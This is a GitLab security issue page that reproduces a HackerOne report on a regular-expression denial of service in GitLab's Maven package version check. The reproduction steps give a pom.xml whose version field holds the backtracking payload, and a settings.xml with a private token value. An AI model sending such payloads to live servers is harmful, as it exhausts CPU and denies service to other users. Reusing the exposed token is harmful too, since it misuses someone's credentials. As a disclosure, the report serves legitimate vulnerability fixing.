

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Maven package version ReDoS

**[HackerOne report #997961](https://hackerone.com/reports/997961)** by `anyday` on 2020-10-05, assigned to [@ngeorge1](/ngeorge1 "Nikhil George"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hello,

Maven package version check <https://docs.gitlab.com/ee/user/packages/maven_repository/#version-validation> contains catastrophic backtracking : `aaaa....!` ([!32925 (merged)](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/32925 "Add validation to maven package version"))

Steps to reproduce:

Follow Maven guide `https://docs.gitlab.com/ee/user/packages/maven_repository/`

* generate project

  `mvn archetype:generate -DgroupId=com.mycompany.mydepartment -DartifactId=my-project -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false`
* create `settings.xml` with your access token (eg at `/root/.m2/settings.xml`)

```
&lt;settings&gt;
  &lt;servers&gt;
    &lt;server&gt;
      &lt;id&gt;gitlab-maven&lt;/id&gt;
      &lt;configuration&gt;
        &lt;httpHeaders&gt;
          &lt;property&gt;
            &lt;name&gt;Private-Token&lt;/name&gt;
            &lt;value&gt;srzc2-M3ysZx-ZEKQRki&lt;/value&gt;
          &lt;/property&gt;
        &lt;/httpHeaders&gt;
      &lt;/configuration&gt;
    &lt;/server&gt;
  &lt;/servers&gt;
&lt;/settings&gt;
```

Edit `pom.xml` with

```
&lt;project xmlns=&#34;http://maven.apache.org/POM/4.0.0&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
  xsi:schemaLocation=&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&#34;&gt;
  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
  &lt;groupId&gt;com.mycompany.mydepartment&lt;/groupId&gt;
  &lt;artifactId&gt;my-project&lt;/artifactId&gt;
  &lt;packaging&gt;jar&lt;/packaging&gt;

  &lt;version&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!/x&lt;/version&gt;&lt;!-- regular expression denial of service --&gt;

  &lt;name&gt;my-project&lt;/name&gt;
  &lt;url&gt;http://maven.apache.org&lt;/url&gt;
  &lt;dependencies&gt;
    &lt;dependency&gt;
      &lt;groupId&gt;junit&lt;/groupId&gt;
      &lt;artifactId&gt;junit&lt;/artifactId&gt;
      &lt;version&gt;3.8.1&lt;/version&gt;
      &lt;scope&gt;test&lt;/scope&gt;
    &lt;/dependency&gt;
  &lt;/dependencies&gt;

  &lt;properties&gt;&lt;!-- Maven was complaining about something --&gt;
    &lt;maven.compiler.source&gt;6&lt;/maven.compiler.source&gt;
    &lt;maven.compiler.target&gt;6&lt;/maven.compiler.target&gt;
  &lt;/properties&gt;

  &lt;repositories&gt;&lt;!------------------------------------------------------------ replace(3) &#39;gitlab.com&#39; and &#39;PROJECT_ID&#39; --&gt;
    &lt;repository&gt;
      &lt;id&gt;gitlab-maven&lt;/id&gt;
      &lt;url&gt;https://gitlab.com/api/v4/packages/maven&lt;/url&gt;
    &lt;/repository&gt;
  &lt;/repositories&gt;

  &lt;distributionManagement&gt;
    &lt;repository&gt;
      &lt;id&gt;gitlab-maven&lt;/id&gt;
      &lt;url&gt;https://gitlab.com/api/v4/projects/PROJECT_ID/packages/maven&lt;/url&gt;
    &lt;/repository&gt;
    &lt;snapshotRepository&gt;
      &lt;id&gt;gitlab-maven&lt;/id&gt;
      &lt;url&gt;https://gitlab.com/api/v4/projects/PROJECT_ID/packages/maven&lt;/url&gt;
    &lt;/snapshotRepository&gt;
  &lt;/distributionManagement&gt;
&lt;/project&gt;

```

* `mvn deploy`

Video:

[mvn\_redos.mp4](https://user-content.gitlab-static.net/e9d7759167ad73b51fe28ca99f4c0f4dfb19a04a/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32666130356139342d323530312d343539612d626263382d3533633933373763363138662f6d766e5f7265646f732e6d7034 "Download 'mvn_redos.mp4'")

#### Impact

Denial of service, CPU exhaustion

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [mvn\_redos.mp4](https://h1.sec.gitlab.net/a/2fa05a94-2501-459a-bbc8-53c9377c618f/mvn_redos.mp4)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

